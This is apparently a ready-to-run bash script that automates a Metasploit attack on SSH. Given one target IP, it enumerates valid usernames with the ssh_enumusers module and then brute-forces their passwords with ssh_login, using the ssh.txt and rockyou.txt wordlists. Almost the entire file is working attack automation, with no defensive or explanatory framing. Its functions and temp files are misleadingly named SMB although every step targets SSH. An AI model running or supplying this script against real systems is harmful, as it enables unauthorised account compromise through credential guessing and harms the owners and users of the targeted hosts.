echo "Setting up BruteForce Scan... put single IP after command"
echo $1 > ipfile.txt


if [ -f "sshbrutesingle.log" ]
	then 
	rm sshbrutesingle.log
	echo "file removed"
fi

#if [ -f "sshGeneric.log" ]
#	then 
#	rm sshGeneric.log
#	echo "file removed"
#fi
#
#if [ -f "sshBruteRockyou.log" ]
#	then 
#	rm sshGeneric.log
#	echo "file removed"
#fi
metasploitSMB(){ 

	#Run the SMB_Version module 
	touch smbMetasploit.rc
	echo "workspace -d ssh">>smbMetasploit.rc
	echo "workspace -a ssh">>smbMetasploit.rc
	echo "spool sshbrutesingle.log">>smbMetasploit.rc
	echo "use scanner/ssh/ssh_enumusers">>smbMetasploit.rc 
	echo "set rhosts file:ipfile.txt">>smbMetasploit.rc	
	echo "set check_false true">>smbMetasploit.rc
	echo "set user_file /usr/share/wordlists/ssh.txt">>smbMetasploit.rc
	echo "show info">>smbMetasploit.rc
	echo "run">>smbMetasploit.rc 
	echo "spool off">>smbMetasploit.rc 
	echo
	echo "exit">>smbMetasploit.rc 
	msfconsole -r smbMetasploit.rc
return 0
}


#CALLING FUNCTION
#Calling function 
#
echo
metasploitSMB; #calling function
sleep 1; #in case you want to look
cat sshbrutesingle.log | grep "+" | cut -d "'" -f 2 > sshUsersFound.txt
rm smbMetasploit.rc 


metasploitSMB1(){ 
	#Run the SMB_Version module 
	touch smbMetasploit.rc
	echo "workspace -d ssh">>smbMetasploit.rc
	echo "workspace -a ssh">>smbMetasploit.rc
	echo "spool sshGeneric.log">>smbMetasploit.rc
	echo "use auxiliary/scanner/ssh/ssh_login">>smbMetasploit.rc 
	echo "set rhosts file:ipfile.txt">>smbMetasploit.rc
	echo "set stop_on_success true">>smbMetasploit.rc
	echo "set verbose true">>smbMetasploit.rc
	echo "set pass_file /usr/share/wordlists/ssh.txt">>smbMetasploit.rc
	echo "set USER_FILE sshUsersFound.txt">>smbMetasploit.rc
	echo "set threads 5">>smbMetasploit.rc
	echo "show info">>smbMetasploit.rc
	echo "run">>smbMetasploit.rc 
	echo "spool off">>smbMetasploit.rc 
	echo

	echo "spool sshBruteRockyou.log">>smbMetasploit.rc
	echo "use auxiliary/scanner/ssh/ssh_login">>smbMetasploit.rc 
	echo "set rhosts file:ipfile.txt">>smbMetasploit.rc
	echo "set stop_on_success true">>smbMetasploit.rc
	echo "set verbose true">>smbMetasploit.rc
	echo "set pass_file /usr/share/wordlists/rockyou.txt">>smbMetasploit.rc
	echo "set USER_FILE sshUsersFound.txt">>smbMetasploit.rc
	echo "set threads 5">>smbMetasploit.rc
	echo "show info">>smbMetasploit.rc
	echo "run">>smbMetasploit.rc 
	echo "spool off">>smbMetasploit.rc 
	echo
	echo "exit">>smbMetasploit.rc 
	msfconsole -r smbMetasploit.rc
	
return 0
}
metasploitSMB1; #calling function
rm smbMetasploit.rc
rm sshUsersFound.txt
rm ipfile.txt
